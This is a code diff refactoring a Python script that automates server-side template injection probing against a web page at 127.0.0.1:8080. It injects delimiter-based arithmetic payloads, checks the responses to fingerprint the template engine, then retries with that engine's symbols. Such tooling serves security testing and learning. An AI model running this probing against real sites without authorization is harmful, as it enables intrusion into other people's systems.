@@ -68,6 +68,21 @@ async def check_server_ready(url):
             await asyncio.sleep(1)  # Check every second
 
 
+def load_engines():
+    te_lst = dict()
+    for _, engines in te_symbols.items():
+        te_lst.update(engines)
+    return te_lst
+
+
+def load_symbols_by_engine(engine):
+    eng_symbols = []
+    for tags, engines in te_symbols.items():
+        if engine in engines:
+            eng_symbols.append(tags)
+    return eng_symbols
+
+
 def generate_numbers_for_product():
     # Define the lower and upper bounds for a 10-digit to 18-digit product
     lower_bound = 10 ** 9  # 10 digits
@@ -204,6 +219,27 @@ def find_template_engines(success_symbols):
     return simple_dict, target_engines
 
 
+async def ssti_attack(success_symbols_lst, success_payloads_lst, symbols, page, url):
+
+    payload, operation = create_payload(symbols)
+    print(f"\nTrying symbols '{symbols}' with payload '{payload}'...")
+
+    response = await inject_payload(page, url, payload)
+    print(response)
+
+    result = str(eval(operation))
+    success, resp_matches = validate_injection(result, response)
+    if success:
+        # check if current symbols have to be added or not
+        store_symbols(success_symbols_lst, success_payloads_lst, symbols, payload)
+
+        print("Successful injection!")
+        for match in resp_matches:
+            print(match)
+    else:
+        print("Failed injection.")
+
+    return response
 
 async def main():
     url = "http://127.0.0.1:8080"
@@ -219,29 +255,41 @@ async def main():
 
     success_symbols_lst = []
     success_payloads_lst = []
-    engines_dct = dict()
-    for _, engines in te_symbols.items():
-        engines_dct.update(engines)
+    engines_dct = load_engines()
 
     for symbols in te_symbols:
+        response = await ssti_attack(success_symbols_lst, success_payloads_lst, symbols, page, url)
+
+
+        """
         curr_symbols = symbols
         payload, operation = create_payload(curr_symbols)
         print(f"\nTrying symbols '{curr_symbols}' with payload '{payload}'...")
 
         response = await inject_payload(page, url, payload)
-        #print(response)
 
-        # looking for an exception reporting the template engine name
-        #####
+        result = str(eval(operation))
+        success, resp_matches = validate_injection(result, response)
+        if success:
+            # check if current symbols have to be added or not
+            store_symbols(success_symbols_lst, success_payloads_lst, curr_symbols, payload)
+
+            print("Successful injection!")
+            for match in resp_matches:
+                print(match)
+        else:
+            print("Failed injection.")
+        
+        """
+
         eng_name = check_te_in_response(response, engines_dct)
         if eng_name != "":
             print(f"\nTemplate engine '{eng_name}' found in the response! ")
             # retrieve the symbols recognized by the engine
-            eng_symbols = []
-            for tags, engines in te_symbols.items():
-                if eng_name in engines:
-                    eng_symbols.append(tags)
-
+            eng_symbols = load_symbols_by_engine(eng_name)
+            for tags in eng_symbols:
+                await ssti_attack(success_symbols_lst, success_payloads_lst, tags, page, url)
+            """
             for curr_tags in eng_symbols:
                 payload, operation = create_payload(curr_tags)
                 print(f"\nTrying symbols '{curr_tags}' with payload '{payload}'...")
@@ -258,20 +306,8 @@ async def main():
                         print(match)
                 else:
                     print("Failed injection.")
+            """
             break
-
-
-        result = str(eval(operation))
-        success, resp_matches = validate_injection(result, response)
-        if success:
-            # check if current symbols have to be added or not
-            store_symbols(success_symbols_lst, success_payloads_lst, curr_symbols, payload)
-
-            print("Successful injection!")
-            for match in resp_matches:
-                print(match)
-        else:
-            print("Failed injection.")
 
     await browser.close()
 
